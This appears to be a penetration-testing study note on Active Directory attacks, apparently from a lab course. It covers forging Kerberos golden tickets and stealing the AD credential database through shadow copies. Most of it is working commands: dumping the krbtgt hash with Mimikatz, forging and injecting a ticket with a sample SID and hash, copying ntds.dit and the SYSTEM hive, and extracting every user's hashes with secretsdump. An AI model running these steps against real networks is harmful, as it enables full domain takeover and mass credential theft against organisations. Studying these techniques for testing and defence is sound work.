
### Golden Ticket

`For this technique to work we will require a Domain Admins group account or to compromise a DC itself to work as a persistence method.`

If we can get the krbtgt hash we can create our own self-made custom TGTs - golden tickets.

golden tickets give us permission to access the entire domains resources.

We could create a TGT stating that a non-priv user is a member of the domain admins group and the domain controller will trust it because it is correctly encrypted.

We can test our access to so a host using:
```
PsExec64.exe \\DC1 cmd.exe
```
and find that we are denied access.

We can extract the hash of the krbtgt account using Mimikatz:
```
privilege::debug
lsadump::lsa /patch
```

This will provide us with the domain SID and the NTLM of the krbtgt account. We can now forge a golden ticket.

`Creating the golden ticket and injecting it into memory does not require any administrative privileges and can even be performed from a computer that is not joined to the domain.`


now on a compromised computer we can delete any existing kerberos tickets:
```
kerberos::purge
```

Get the domain SID of the current domain we are on:
```
whoami /user
```

then forge and inject a golden ticket with the SID we just obtained:
```
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

`Mimikatz provides two sets of default values when using the golden ticket option: the user ID and the groups ID. The user ID is set to 500 by default, which is the RID of the built-in administrator for the domain. The values for the groups ID consist of the most privileged groups in Active Directory, including the Domain Admins group.`

when can then use:
```
misc::cmd
```

and verify out golden ticket works:
```
PsExec.exe \\dc1 cmd.exe

whoami

whoami /groups
```

We have to use the hostname - if we use the ip our access will be denied.


### Shadow Copies

requires domain admin

A shadow copy is also known as the `Volume Shadow Service (VSS)`. its a MS backup technology that allows creation of snapshots of files or entire volumes.

this can be abused to create a shadow copy that will allows us to extract the AD database NTDS.dit file. Once obtained we need the SYSTEM hive and then we can extract every user credential offline on our local kali.

we can run the utility with an elevated CMD:
```
vshadow.exe -nw -p C:
```

Take note of the shadow copy device.

we can then copy the DB using:
```
copy <shadow_copy_device>\windows\ntds\ntds.dit c:\ntds.dit.bak
```

example:
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

We then need to save the SYSTEM hive from the windows registry:
```
reg.exe save hklm\system c:\system.bak
```

Now we can move both these .bak files to our kali machine and extract all the information.

extract the information using:
```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

We now have all the NTML hashes and kerberos keys for every AD user.

We can now attempt to crack them or use them in pass the hash attacks.

